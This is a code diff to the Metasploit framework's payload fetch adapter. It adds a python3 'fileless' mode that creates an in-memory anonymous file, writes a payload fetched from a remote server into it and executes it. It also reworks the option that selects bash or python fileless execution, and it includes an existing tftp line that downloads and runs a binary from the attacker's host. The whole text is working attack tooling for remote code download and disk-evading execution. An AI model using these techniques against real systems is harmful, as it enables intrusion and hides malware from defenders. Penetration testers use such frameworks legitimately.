@@ -209,7 +209,9 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def _execute_nix(get_file_cmd)
-    return _generate_fileless(get_file_cmd) if datastore['FETCH_FILELESS']
+    return _generate_fileless(get_file_cmd) if datastore['FETCH_FILELESS'] == 'bash'
+    return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
+
 
     cmds = get_file_cmd
     cmds << ";chmod +x #{_remote_destination_nix}"
@@ -232,6 +234,7 @@ module Msf::Payload::Adapter::Fetch
     end
     _execute_add(get_file_cmd)
   end
+  
 
   # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
   def _generate_fileless(get_file_cmd)
@@ -257,6 +260,11 @@ module Msf::Payload::Adapter::Fetch
     cmd << '; done'
 
     cmd
+  end
+  
+  # same idea as _generate_fileless function, but force creating anonymous file handle
+  def _generate_fileless_python(get_file_cmd)
+    %Q<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'> 
   end
 
   def _generate_curl_command
@@ -295,7 +303,7 @@ module Msf::Payload::Adapter::Fetch
         fetch_command = _execute_win("tftp -i #{srvhost} GET #{srvuri} #{_remote_destination}")
       else
         _check_tftp_file
-        if datastore['FETCH_FILELESS'] && linux?
+        if datastore['FETCH_FILELESS'] != 'none' && linux?
           return _generate_fileless("(echo binary ; echo get #{srvuri} $f ) | tftp #{srvhost}")
         else
           fetch_command = "(echo binary ; echo get #{srvuri} ) | tftp #{srvhost}; chmod +x ./#{srvuri}; ./#{srvuri} &"
@@ -343,7 +351,7 @@ module Msf::Payload::Adapter::Fetch
   def _remote_destination_nix
     return @remote_destination_nix unless @remote_destination_nix.nil?
 
-    if datastore['FETCH_FILELESS']
+    if datastore['FETCH_FILELESS'] != 'none'
       @remote_destination_nix = '$f'
       return @remote_destination_nix
     end
